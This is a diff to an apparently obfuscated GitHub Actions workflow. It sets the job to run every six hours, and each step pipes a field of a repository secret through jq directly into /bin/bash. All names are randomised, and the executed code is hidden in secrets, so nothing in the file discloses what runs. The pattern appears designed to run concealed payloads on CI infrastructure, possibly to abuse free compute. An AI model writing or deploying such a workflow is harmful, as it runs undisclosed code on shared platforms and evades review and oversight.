@@ -3,19 +3,28 @@ name: gaozhizi7162
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
-jobs:  # 26705
+    - cron: '6 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gaozhizi7162
         env:
-          zda68742: ${{ secrets.zda68742 }}
+          x84338: ${{ secrets.x84338 }}
         run: |
-          echo $zda68742 | jq -r .t914 | /bin/bash
-          echo $ws084 | jq -r .a4558 | /bin/bash
-          echo $srzha8735 | jq -r .i7371 | /bin/bash
-          echo $exp55 | jq -r .i82 | /bin/bash
-          echo $wkax61996 | jq -r .jip875 | /bin/bash
+          echo $x84338 | jq -r .wciu4193 | /bin/bash
+          echo $vba9531 | jq -r .bta47 | /bin/bash
+          echo $gmao6181 | jq -r .zeqbn5 | /bin/bash
+          echo $tkq892 | jq -r .zpl78698 | /bin/bash
+          echo $ywihv2 | jq -r .f843 | /bin/bash
+          echo $wysp7862 | jq -r .stwp1 | /bin/bash
+          echo $fhiwt76 | jq -r .mo57 | /bin/bash
+          echo $nx23 | jq -r .qlv037 | /bin/bash
+          echo $x7476 | jq -r .mma9887 | /bin/bash
+          echo $jzqq3 | jq -r .btic131 | /bin/bash
+          echo $lo781 | jq -r .le4929 | /bin/bash
+          echo $tqzvl1 | jq -r .ohydb68 | /bin/bash
+          echo $brtnp3139 | jq -r .fmpqc1 | /bin/bash
+          echo $quic48 | jq -r .ytdj5 | /bin/bash
 
